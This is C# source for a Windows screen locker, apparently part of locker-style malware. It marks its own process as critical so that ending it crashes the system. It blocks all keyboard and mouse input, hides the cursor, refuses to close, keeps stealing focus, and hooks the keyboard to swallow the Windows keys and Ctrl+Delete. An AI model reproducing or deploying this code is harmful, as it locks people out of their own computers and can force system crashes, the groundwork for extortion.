using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace locker
{
    public partial class Form1 : Form
    {
        const int ProcessBreakOnTermination = 0x1D;
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

        [DllImport("user32.dll")]
        public static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll")]
        public static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll")]
        public static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        public delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool BlockInput(bool fBlockIt);

        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;

        [DllImport("user32.dll")]
        private static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

        [DllImport("user32.dll")]
        private static extern bool SetForegroundWindow(IntPtr hWnd);

        public Form1()
        {
            Process currproc = Process.GetCurrentProcess();
            IntPtr handleproc = currproc.Handle;

            int critical = 1;
            NtSetInformationProcess(handleproc, ProcessBreakOnTermination, ref critical, sizeof(int));
            InitializeComponent();
            this.Load += (sender, e) => Cursor.Hide();
            timer1.Start();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            _hookID = SetHook(_proc);
            UnhookWindowsHookEx(_hookID);
            BlockInput(true);
        }


        private void button2_Click(object sender, EventArgs e)
        {
            var NewForm = new cmd();
            NewForm.ShowDialog();
        }

        private void label10_Click(object sender, EventArgs e)
        {

        }

        private void label5_Click(object sender, EventArgs e)
        {

        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            timer1.Stop();
            _hookID = SetHook(_proc);
            UnhookWindowsHookEx(_hookID);
            timer1.Start();
        }

        private void timer2_Tick(object sender, EventArgs e)
        {
            timer2.Stop();
            this.Focus();
            timer2.Start();
        }


        private void timer3_Tick(object sender, EventArgs e)
        {

        }

        private void Form1_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Delete)
            {
                e.SuppressKeyPress = true;
                        e.Handled = true;
            }
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (var curProcess = System.Diagnostics.Process.GetCurrentProcess())
            using (var curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private const int WH_KEYBOARD_LL = 13;

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0)
            {
                // Check for Windows key and Ctrl + Alt + Delete
                if (wParam == (IntPtr)WM_KEYDOWN)
                {
                    int vkCode = Marshal.ReadInt32(lParam);
                    if (vkCode == 91 || vkCode == 92 || (Control.ModifierKeys == Keys.Control && (vkCode == (int)Keys.Delete)))
                    {
                        return (IntPtr)1; // Block the key
                    }
                }
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        private const int WM_KEYDOWN = 0x0100;

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        private void Form1_MouseHover(object sender, EventArgs e)
        {

        }
    }
}
